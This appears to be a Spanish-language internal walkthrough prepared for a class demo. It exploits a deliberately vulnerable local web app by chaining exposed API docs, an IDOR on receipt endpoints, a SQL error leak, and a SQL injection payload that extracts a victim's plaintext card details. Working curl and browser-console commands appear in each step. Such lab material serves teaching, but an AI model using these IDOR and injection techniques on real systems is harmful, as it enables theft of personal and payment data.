# Walkthrough de la demo (guía interna del Grupo 3)

Guion paso a paso para explotar la cadena **en vivo**. No se muestra en la app:
es material de preparación para la presentación y el informe.

- **App:** http://127.0.0.1:5000
- **Atacante:** `nico` / `nico123` (competidor malicioso, `cliente_id = 89`)
- **Víctima:** `cliente_id = 458` (titular "Carlos Lopez")
- **Objetivo:** exfiltrar el **historial comercial y los datos de tarjeta** de la víctima.

> Los comandos usan `curl.exe` (en PowerShell escribí `curl.exe`, no `curl`, para
> evitar el alias de Windows). También se indica la alternativa por navegador.
> (Versión Linux/macOS: `WALKTHROUGH_LINUX_MINT.md`.)

---

## Paso 0 — Autenticarse como usuario básico

**Navegador:** entrá a http://127.0.0.1:5000, login `nico` / `nico123`.
Vas a ver solo *tus* pedidos (cliente 89).

**curl (guarda la cookie de sesión):**
```powershell
curl.exe -c cookies.txt -X POST http://127.0.0.1:5000/api/auth/login `
  -H "Content-Type: application/json" `
  -d "{\"username\":\"nico\",\"password\":\"nico123\"}"
```

---

## Paso 1 — A02: Security Misconfiguration (docs de API expuestas)

> **Depende de:** nada (punto de entrada). La doc revela *dónde* están los endpoints
> legacy, pero ya **no** entrega ninguna referencia usable: el valor hay que ganárselo
> en el Paso 2.

La documentación interactiva de la API está publicada **sin autenticación**.

**Navegador:** abrí http://127.0.0.1:5000/api/docs
(probalo incluso en una ventana de incógnito **sin loguearte**: igual carga).

**Qué observar / contar:**
- Aparece **todo** el mapa de endpoints, incluido el grupo **"Reportes (v1)"**.
- Se ve un endpoint *legacy* que **no** está en la web pública:
  `GET /api/v1/pedidos/{pedido_id}/comprobante`.
- También `GET /api/v1/facturas/ver?ref=` con su formato de referencia.

**Resultado:** el atacante descubre la ruta y el formato exacto del endpoint de
comprobantes, que usará en el Paso 2.

---

## Paso 2 — A01: Broken Access Control / IDOR

> **Depende del Paso 1:** usamos la ruta del comprobante descubierta en `/api/docs`.
> Este paso es la **única** fuente del `cliente_id` de la víctima (458) y de una
> `factura_referencia` válida (token opaco). Sin él no se pueden armar los Pasos 3 y 4.

El endpoint del comprobante exige sesión pero **no valida la propiedad**.
Como `nico`, pedimos el comprobante de **nuestro** pedido y después probamos
números correlativos hacia atrás.

**curl (pedido propio, luego ajeno):**
```powershell
curl.exe -b cookies.txt http://127.0.0.1:5000/api/v1/pedidos/105/comprobante
curl.exe -b cookies.txt http://127.0.0.1:5000/api/v1/pedidos/104/comprobante
```

**Navegador:** andá directo a http://127.0.0.1:5000/api/v1/pedidos/104/comprobante

**Qué observar:** el pedido `104` **no es nuestro**; responde:
```json
{
  "pedido_id": 104,
  "fecha": "2026-09-10",
  "cliente_id": 458,
  "factura_referencia": "FAC-2026-A7K9QD2F",
  "total": 125000.00
}
```

**Resultado:** obtenemos el identificador de la víctima (`cliente_id=458`) y su
**referencia de factura** (`FAC-2026-A7K9QD2F`).

---

## Paso 3 — A10: Mishandling of Exceptional Conditions

> **Depende del Paso 2:** necesitamos la referencia opaca de la víctima
> (`FAC-2026-A7K9QD2F`) para pasar el filtro de formato y romper el SQL. La fuga de error
> revela la tabla interna (`ldg_fin_legacy`) y la columna `acct_no`, dato que exige el Paso 4.

La consulta de facturas valida el **formato** de la referencia con una expresión
regular (`^FAC-\d{4}-[A-Z0-9]{8}`), pero esa validación ancla **solo el inicio** del
texto: si el valor empieza con el patrón, lo deja pasar aunque tenga basura
después.

**3a. Consulta legítima (referencia obtenida en el Paso 2):**
```powershell
curl.exe -b cookies.txt "http://127.0.0.1:5000/api/v1/facturas/ver?ref=FAC-2026-A7K9QD2F"
```
Devuelve **200 OK** con la factura.

**3b. Rechazo por formato (confirma que el filtro existe):**
```powershell
curl.exe -b cookies.txt "http://127.0.0.1:5000/api/v1/facturas/ver?ref=NO-FORMATO"
```
Devuelve **400 Bad Request** sin tocar la base.

**3c. Romper el SQL agregando una comilla al final (fuga de error, A10):**
```powershell
curl.exe -b cookies.txt "http://127.0.0.1:5000/api/v1/facturas/ver?ref=FAC-2026-A7K9QD2F'"
```
La `'` supera el filtro de formato pero rompe la consulta. Como no hay manejo
seguro de excepciones, la respuesta es **500** y filtra el error de la base y la
**query completa**:
```json
{
  "error": "unterminated quoted string at or near \"'FAC-2026-A7K9QD2F''\" ...",
  "query": "SELECT id, acct_no, fecha, total, detalle_items, pay_raw FROM ldg_fin_legacy WHERE doc_ref = 'FAC-2026-A7K9QD2F''"
}
```

**Resultado:** confirmamos la inyección en `ref` y descubrimos la tabla interna
(`ldg_fin_legacy`) y sus columnas (`id, acct_no, fecha, total, detalle_items,
pay_raw`).

---

## Paso 4 — A05 (Injection) + A04 (Cryptographic Failures): objetivo final

> **Depende de los Pasos 2 y 3:** el payload acotado a la víctima usa el `cliente_id=458`
> del Paso 2 **y** el nombre de columna `acct_no` filtrado en el Paso 3. Con ninguno de los
> dos por separado se llega a este resultado acotado.

Reutilizamos la referencia legítima para sortear el filtro y concatenamos la
inyección: con `OR acct_no=458` forzamos que la condición sea verdadera para
**todas** las transacciones de la víctima, y comentamos el resto con `--`.

**curl:**
```powershell
curl.exe -b cookies.txt "http://127.0.0.1:5000/api/v1/facturas/ver?ref=FAC-2026-A7K9QD2F' OR acct_no=458-- "
```

**Alternativa por navegador (consola DevTools, F12):**
```javascript
fetch("/api/v1/facturas/ver?ref=" + encodeURIComponent("FAC-2026-A7K9QD2F' OR acct_no=458-- "))
  .then(r => r.json()).then(console.log);
```

La query interpretada por el motor resulta:
```sql
SELECT id, acct_no, fecha, total, detalle_items, pay_raw
FROM ldg_fin_legacy WHERE doc_ref = 'FAC-2026-A7K9QD2F' OR acct_no=458--';
```

**Qué observar:** responde **200 OK** con una **lista** (transacciones 88, 95 y
104) — todo el historial de la víctima, incluyendo `pay_raw` con el **número
de tarjeta, vencimiento, CVV y titular en texto plano** (A04):
```json
"pay_raw": "PAN: 4509-8812-3456-8921 | VENC: 11/28 | CVV: 732 | TITULAR: CARLOS LOPEZ"
```

✅ **Objetivo cumplido:** exfiltración de datos bancarios e inteligencia comercial
(productos, cantidades, precios y recurrencia de compra) sin privilegios de admin.

---

## Cierre de la cadena

```
/api/docs (A02)  →  descubre /api/v1/pedidos/{id}/comprobante
      ↓
/api/v1/pedidos/{id}/comprobante (A01 IDOR)  →  cliente víctima + referencia de factura
      ↓
/api/v1/facturas/ver?ref=... '  (A10)  →  fuga de error: tabla ldg_fin_legacy + columnas
      ↓
/api/v1/facturas/ver?ref=...' OR acct_no=458--  (A05 + A04)  →  historial + tarjetas en claro
```

Para repetir la demo desde cero: `python scripts/reset_db.py`.
